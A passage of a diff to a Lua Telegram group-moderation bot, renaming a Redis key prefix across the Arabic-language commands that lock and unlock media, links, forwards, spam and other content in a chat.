 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الفشار بالفعل مفتوح في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "الطائفيه" then
-if not DevALI:get(Jenral..'ALI:Lock:Taf'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:Taf'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الطائفيه")  
-DevALI:set(Jenral..'ALI:Lock:Taf'..msg.chat_id_,true)
+DevALI:set(JENRAL..'ALI:Lock:Taf'..msg.chat_id_,true)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الطائفيه بالفعل مفتوحه في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "الكفر" then
-if not DevALI:get(Jenral..'ALI:Lock:Kfr'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:Kfr'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الكفر")  
-DevALI:set(Jenral..'ALI:Lock:Kfr'..msg.chat_id_,true)
+DevALI:set(JENRAL..'ALI:Lock:Kfr'..msg.chat_id_,true)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الكفر بالفعل مفتوح في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "الفارسيه بالطرد" then
-if DevALI:get(Jenral..'ALI:Lock:FarsiBan'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:FarsiBan'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الفارسيه بالطرد")  
-DevALI:del(Jenral..'ALI:Lock:FarsiBan'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Lock:FarsiBan'..msg.chat_id_)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الفارسيه بالطرد بالفعل مفتوحه', 1, 'md')
 end
 end
 if UnLockText[2] == "البوتات" or UnLockText[2] == "البوتات بالطرد" or UnLockText[2] == "البوتات بالتقييد" or UnLockText[2] == "البوتات بالتقيد" then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح البوتات")  
-DevALI:del(Jenral.."ALI:Lock:Bots"..msg.chat_id_)  
+DevALI:del(JENRAL.."ALI:Lock:Bots"..msg.chat_id_)  
 end
 if UnLockText[2] == "التكرار" then 
-DevALI:hdel(Jenral.."ALI:Spam:Group:User"..msg.chat_id_ ,"Spam:User")  
+DevALI:hdel(JENRAL.."ALI:Spam:Group:User"..msg.chat_id_ ,"Spam:User")  
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح التكرار")  
 end
 if BasicConstructor(msg) then
 if UnLockText[2] == "التثبيت" then
-if DevALI:get(Jenral..'ALI:Lock:Pin'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Pin'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح التثبيت")  
-DevALI:del(Jenral..'ALI:Lock:Pin'..msg.chat_id_)
-DevALI:srem(Jenral.."ALI:Lock:Pinpin",msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Lock:Pin'..msg.chat_id_)
+DevALI:srem(JENRAL.."ALI:Lock:Pinpin",msg.chat_id_)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙التثبيت بالفعل مفتوح في المجموعه', 1, 'md')
 end end end
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if Admin(msg) then
 if text and text:match("^قفل (.*)$") then
 local LockText = {string.match(text, "^(قفل) (.*)$")}
 if LockText[2] == "الدردشه" then
-if not DevALI:get(Jenral..'ALI:Lock:Text'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:Text'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الدردشه")  
-DevALI:set(Jenral..'ALI:Lock:Text'..msg.chat_id_,true)
+DevALI:set(JENRAL..'ALI:Lock:Text'..msg.chat_id_,true)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الدردشه بالفعل مقفله في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "الاونلاين" then
-if not DevALI:get(Jenral..'ALI:Lock:Inline'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:Inline'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الاونلاين")  
-DevALI:set(Jenral..'ALI:Lock:Inline'..msg.chat_id_,true)
+DevALI:set(JENRAL..'ALI:Lock:Inline'..msg.chat_id_,true)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الاونلاين بالفعل مقفل في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "الصور" then
-if not DevALI:get(Jenral..'ALI:Lock:Photo'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:Photo'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الصور")  
-DevALI:set(Jenral..'ALI:Lock:Photo'..msg.chat_id_,true)
+DevALI:set(JENRAL..'ALI:Lock:Photo'..msg.chat_id_,true)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الصور بالفعل مقفله في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "الكلايش" then
-if not DevALI:get(Jenral..'ALI:Lock:Spam'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:Spam'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الكلايش")  
-DevALI:set(Jenral..'ALI:Lock:Spam'..msg.chat_id_,true)
+DevALI:set(JENRAL..'ALI:Lock:Spam'..msg.chat_id_,true)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الكلايش بالفعل مقفله في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "الدخول" then
-if not DevALI:get(Jenral..'ALI:Lock:Join'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:Join'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الدخول")  
-DevALI:set(Jenral..'ALI:Lock:Join'..msg.chat_id_,true)
+DevALI:set(JENRAL..'ALI:Lock:Join'..msg.chat_id_,true)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الدخول بالفعل مقفل في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "الفيديو" then
-if not DevALI:get(Jenral..'ALI:Lock:Videos'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:Videos'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الفيديو")  
-DevALI:set(Jenral..'ALI:Lock:Videos'..msg.chat_id_,true)
+DevALI:set(JENRAL..'ALI:Lock:Videos'..msg.chat_id_,true)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الفيديو بالفعل مقفل في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "المتحركه" then
-if not DevALI:get(Jenral..'ALI:Lock:Gifs'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:Gifs'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل المتحركه")  
-DevALI:set(Jenral..'ALI:Lock:Gifs'..msg.chat_id_,true)
+DevALI:set(JENRAL..'ALI:Lock:Gifs'..msg.chat_id_,true)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙المتحركه بالفعل مقفله في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "الاغاني" then
-if not DevALI:get(Jenral..'ALI:Lock:Music'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:Music'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الاغاني")  
-DevALI:set(Jenral..'ALI:Lock:Music'..msg.chat_id_,true)
+DevALI:set(JENRAL..'ALI:Lock:Music'..msg.chat_id_,true)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الاغاني بالفعل مقفله في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "الصوت" then
-if not DevALI:get(Jenral..'ALI:Lock:Voice'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:Voice'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الصوت")  
-DevALI:set(Jenral..'ALI:Lock:Voice'..msg.chat_id_,true)
+DevALI:set(JENRAL..'ALI:Lock:Voice'..msg.chat_id_,true)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الصوت بالفعل مقفل في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "الروابط" then
-if not DevALI:get(Jenral..'ALI:Lock:Links'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:Links'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الروابط")  
-DevALI:set(Jenral..'ALI:Lock:Links'..msg.chat_id_,true)
+DevALI:set(JENRAL..'ALI:Lock:Links'..msg.chat_id_,true)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الروابط بالفعل مقفله في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "المواقع" then
-if not DevALI:get(Jenral..'ALI:Lock:Location'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:Location'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل المواقع")  
-DevALI:set(Jenral..'ALI:Lock:Location'..msg.chat_id_,true)
+DevALI:set(JENRAL..'ALI:Lock:Location'..msg.chat_id_,true)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙المواقع بالفعل مقفله في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "المعرف" or LockText[2] == "المعرفات" then
-if not DevALI:get(Jenral..'ALI:Lock:Tags'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:Tags'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل المعرفات")  
-DevALI:set(Jenral..'ALI:Lock:Tags'..msg.chat_id_,true)
+DevALI:set(JENRAL..'ALI:Lock:Tags'..msg.chat_id_,true)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙المعرفات بالفعل مقفله في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "الملفات" then
-if not DevALI:get(Jenral..'ALI:Lock:Document'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:Document'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الملفات")  
-DevALI:set(Jenral..'ALI:Lock:Document'..msg.chat_id_,true)
+DevALI:set(JENRAL..'ALI:Lock:Document'..msg.chat_id_,true)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الملفات بالفعل مقفله في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "الهاشتاك" or LockText[2] == "التاك" then
-if not DevALI:get(Jenral..'ALI:Lock:Hashtak'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:Hashtak'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الهاشتاك")  
-DevALI:set(Jenral..'ALI:Lock:Hashtak'..msg.chat_id_,true)
+DevALI:set(JENRAL..'ALI:Lock:Hashtak'..msg.chat_id_,true)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الهاشتاك بالفعل مقفل في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "الجهات" then
-if not DevALI:get(Jenral..'ALI:Lock:Contact'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:Contact'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الجهات")  
-DevALI:set(Jenral..'ALI:Lock:Contact'..msg.chat_id_,true)
+DevALI:set(JENRAL..'ALI:Lock:Contact'..msg.chat_id_,true)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '️⌁︙الجهات بالفعل مقفله في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "الشبكات" then
-if not DevALI:get(Jenral..'ALI:Lock:WebLinks'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:WebLinks'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الشبكات")  
-DevALI:set(Jenral..'ALI:Lock:WebLinks'..msg.chat_id_,true) 
+DevALI:set(JENRAL..'ALI:Lock:WebLinks'..msg.chat_id_,true) 
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الشبكات بالفعل مقفله في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "العربيه" then
-if not DevALI:get(Jenral..'ALI:Lock:Arabic'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:Arabic'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل العربيه")  
-DevALI:set(Jenral..'ALI:Lock:Arabic'..msg.chat_id_,true)
+DevALI:set(JENRAL..'ALI:Lock:Arabic'..msg.chat_id_,true)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙العربيه بالفعل مقفله في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "الانكليزيه" then
-if not DevALI:get(Jenral..'ALI:Lock:English'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:English'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الانكليزيه")  
-DevALI:set(Jenral..'ALI:Lock:English'..msg.chat_id_,true)
+DevALI:set(JENRAL..'ALI:Lock:English'..msg.chat_id_,true)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الانكليزيه بالفعل مقفله في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "الملصقات" then
-if not DevALI:get(Jenral..'ALI:Lock:Stickers'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:Stickers'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الملصقات")  
-DevALI:set(Jenral..'ALI:Lock:Stickers'..msg.chat_id_,true)
+DevALI:set(JENRAL..'ALI:Lock:Stickers'..msg.chat_id_,true)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الملصقات بالفعل مقفله في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "الماركداون" then
-if not DevALI:get(Jenral..'ALI:Lock:Markdown'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:Markdown'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الماركداون")  
-DevALI:set(Jenral..'ALI:Lock:Markdown'..msg.chat_id_,true)
+DevALI:set(JENRAL..'ALI:Lock:Markdown'..msg.chat_id_,true)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الماركداون بالفعل مقفل في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "الاشعارات" then
-if not DevALI:get(Jenral..'ALI:Lock:TagServr'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:TagServr'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الاشعارات")  
-DevALI:set(Jenral..'ALI:Lock:TagServr'..msg.chat_id_,true)
+DevALI:set(JENRAL..'ALI:Lock:TagServr'..msg.chat_id_,true)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الاشعارات بالفعل مقفله في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "التوجيه" then
-if not DevALI:get(Jenral..'ALI:Lock:Forwards'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:Forwards'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل التوجيه")  
-DevALI:set(Jenral..'ALI:Lock:Forwards'..msg.chat_id_,true)
+DevALI:set(JENRAL..'ALI:Lock:Forwards'..msg.chat_id_,true)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙التوجيه بالفعل مقفل في المجموعه', 1, 'md')
 end
 end
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if Admin(msg) then
 if text and text:match("^فتح (.*)$") then
 local UnLockText = {string.match(text, "^(فتح) (.*)$")}
 if UnLockText[2] == "الدردشه" then
-if DevALI:get(Jenral..'ALI:Lock:Text'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Text'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الدردشه")  
-DevALI:del(Jenral..'ALI:Lock:Text'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Lock:Text'..msg.chat_id_)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الدردشه بالفعل مفتوحه في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "الصور" then
-if DevALI:get(Jenral..'ALI:Lock:Photo'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Photo'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الصور")  
-DevALI:del(Jenral..'ALI:Lock:Photo'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Lock:Photo'..msg.chat_id_)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الصور بالفعل مفتوحه في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "الكلايش" then
-if DevALI:get(Jenral..'ALI:Lock:Spam'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Spam'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الكلايش")  
-DevALI:del(Jenral..'ALI:Lock:Spam'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Lock:Spam'..msg.chat_id_)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الكلايش بالفعل مفتوحه في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "الدخول" then
-if DevALI:get(Jenral..'ALI:Lock:Join'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Join'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الدخول")  
-DevALI:del(Jenral..'ALI:Lock:Join'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Lock:Join'..msg.chat_id_)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الدخول بالفعل مفتوح في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "الفيديو" then
-if DevALI:get(Jenral..'ALI:Lock:Videos'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Videos'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الفيديو")  
-DevALI:del(Jenral..'ALI:Lock:Videos'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Lock:Videos'..msg.chat_id_)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الفيديو بالفعل مفتوحه في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "الملفات" then
-if DevALI:get(Jenral..'ALI:Lock:Document'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Document'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الملفات")  
-DevALI:del(Jenral..'ALI:Lock:Document'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Lock:Document'..msg.chat_id_)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الملفات بالفعل مفتوحه في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "الاونلاين" then
-if DevALI:get(Jenral..'ALI:Lock:Inline'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Inline'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الاونلاين")  
-DevALI:del(Jenral..'ALI:Lock:Inline'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Lock:Inline'..msg.chat_id_)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الاونلاين بالفعل مفتوحه في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "الماركداون" then
-if DevALI:get(Jenral..'ALI:Lock:Markdown'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Markdown'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الماركداون")  
-DevALI:del(Jenral..'ALI:Lock:Markdown'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Lock:Markdown'..msg.chat_id_)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الماركداون بالفعل مفتوحه في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "المتحركه" then
-if DevALI:get(Jenral..'ALI:Lock:Gifs'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Gifs'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح المتحركه")  
-DevALI:del(Jenral..'ALI:Lock:Gifs'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Lock:Gifs'..msg.chat_id_)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙المتحركه بالفعل مفتوحه في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "الاغاني" then
-if DevALI:get(Jenral..'ALI:Lock:Music'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Music'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الاغاني")  
-DevALI:del(Jenral..'ALI:Lock:Music'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Lock:Music'..msg.chat_id_)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الاغاني بالفعل مفتوحه في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "الصوت" then
-if DevALI:get(Jenral..'ALI:Lock:Voice'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Voice'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الصوت")  
-DevALI:del(Jenral..'ALI:Lock:Voice'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Lock:Voice'..msg.chat_id_)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الصوت بالفعل مفتوحه في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "الروابط" then
-if DevALI:get(Jenral..'ALI:Lock:Links'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Links'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الروابط")  
-DevALI:del(Jenral..'ALI:Lock:Links'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Lock:Links'..msg.chat_id_)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الروابط بالفعل مفتوحه في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "المواقع" then
-if DevALI:get(Jenral..'ALI:Lock:Location'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Location'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح المواقع")  
-DevALI:del(Jenral..'ALI:Lock:Location'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Lock:Location'..msg.chat_id_)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙المواقع بالفعل مفتوحه في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "المعرف" or UnLockText[2] == "المعرفات" then
-if DevALI:get(Jenral..'ALI:Lock:Tags'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Tags'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح المعرفات")  
-DevALI:del(Jenral..'ALI:Lock:Tags'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Lock:Tags'..msg.chat_id_)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙المعرفات بالفعل مفتوحه في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "الهاشتاك" or UnLockText[2] == "التاك" then
-if DevALI:get(Jenral..'ALI:Lock:Hashtak'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Hashtak'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الهاشتاك")  
-DevALI:del(Jenral..'ALI:Lock:Hashtak'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Lock:Hashtak'..msg.chat_id_)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الهاشتاك بالفعل مفتوحه في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "الجهات" then
-if DevALI:get(Jenral..'ALI:Lock:Contact'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Contact'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الجهات")  
-DevALI:del(Jenral..'ALI:Lock:Contact'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Lock:Contact'..msg.chat_id_)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الجهات بالفعل مفتوحه في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "الشبكات" then
-if DevALI:get(Jenral..'ALI:Lock:WebLinks'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:WebLinks'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الشبكات")  
-DevALI:del(Jenral..'ALI:Lock:WebLinks'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Lock:WebLinks'..msg.chat_id_)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الشبكات بالفعل مفتوحه في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "العربيه" then
-if DevALI:get(Jenral..'ALI:Lock:Arabic'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Arabic'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح العربيه")  
-DevALI:del(Jenral..'ALI:Lock:Arabic'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Lock:Arabic'..msg.chat_id_)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙العربيه بالفعل مفتوحه في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "الانكليزيه" then
-if DevALI:get(Jenral..'ALI:Lock:English'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:English'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الانكليزيه")  
-DevALI:del(Jenral..'ALI:Lock:English'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Lock:English'..msg.chat_id_)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الانكليزيه بالفعل مفتوحه في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "الاشعارات" then
-if DevALI:get(Jenral..'ALI:Lock:TagServr'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:TagServr'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الاشعارات")  
-DevALI:del(Jenral..'ALI:Lock:TagServr'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Lock:TagServr'..msg.chat_id_)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الاشعارات بالفعل مفتوحه في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "الملصقات" then
-if DevALI:get(Jenral..'ALI:Lock:Stickers'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Stickers'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الملصقات")  
-DevALI:del(Jenral..'ALI:Lock:Stickers'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Lock:Stickers'..msg.chat_id_)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الملصقات بالفعل مفتوحه في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "التوجيه" then
-if DevALI:get(Jenral..'ALI:Lock:Forwards'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Forwards'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح التوجيه")  
-DevALI:del(Jenral..'ALI:Lock:Forwards'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Lock:Forwards'..msg.chat_id_)
